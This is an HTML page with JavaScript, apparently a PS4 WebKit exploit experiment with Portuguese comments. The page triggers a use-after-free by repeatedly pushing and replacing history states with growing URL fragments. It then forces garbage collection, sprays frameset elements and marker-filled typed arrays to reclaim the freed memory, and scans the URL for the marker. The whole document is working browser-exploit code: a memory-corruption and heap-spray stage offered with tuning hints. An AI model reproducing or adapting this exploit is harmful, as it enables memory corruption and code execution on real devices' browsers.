<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Reclamation (Minimal Mod)</title>

</head>
<body>
<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
<div id="status">Ready</div>
<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// Mantendo sua função de GC original
function gc() {
    log("Forcing GC...");
    for(let i=0; i<10; i++) {
        new Uint8Array(4 * 1024 * 1024); 
    }
}

// === SEU UAF ORIGINAL (SEM ALTERAÇÕES NA LÓGICA) ===
async function triggerBaseUAF() {
    logEl.textContent = "";
    log("=== STARTING STABLE UAF (i < 48) ===");
    let size = 977;
    const STEP = 14461;
    for(let i=0; i<48; i++){
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        size += STEP;
        await sleep(5);
    }
    // Reduzi o sleep final de 40 para 10 para o spray não chegar atrasado
    await sleep(10); 
}

async function runStepD() {
    // 1. Gatilho Original
    await triggerBaseUAF();
    
    // 2. O seu GC
    gc();
    
    log("Spraying memory...");
    let sprayFrames = [];
    let sprayArrays = [];
    
    // 3. Spray Agressivo (Minimal Mod: aumentei a quantidade para garantir ocupação)
    const rowsPattern = ",".repeat(254); 
    for(let i = 0; i < 1000; i++) { // Aumentado de 400 para 600
        let fset = document.createElement("frameset");
        fset.rows = rowsPattern;
        sprayFrames.push(fset);

        // Intercalando alocações de Array para ocupar fastMalloc e JSHeap
        if(i % 2 === 0) {
            let a = new Uint32Array(340356 / 4);
            a.fill(0x41424344); 
            sprayArrays.push(a);
        }
    }

    window.keepAlive = [sprayFrames, sprayArrays];
    await sleep(50);

    // 4. Scan de Verificação
    let url = document.URL;
    log("Scanning offsets...");
    let found = false;
    
    // Verificando uma range maior da URL para não perder o marcador
    for(let off = 0; off < url.length; off++) {
        let code = url.charCodeAt(off);
        if(code === 0x44 || code === 0x41) {
            log("SUCCESS! Reclaimed at [" + off + "]: 0x" + code.toString(16).toUpperCase());
            found = true;
            break;
        }
    }
    
    if(!found) {
        log("Falha: Marcador não encontrado.");
        log("Tente aumentar o STEP ou diminuir o sleep pós-UAF.");
    }
}
</script>
</body>
</html>
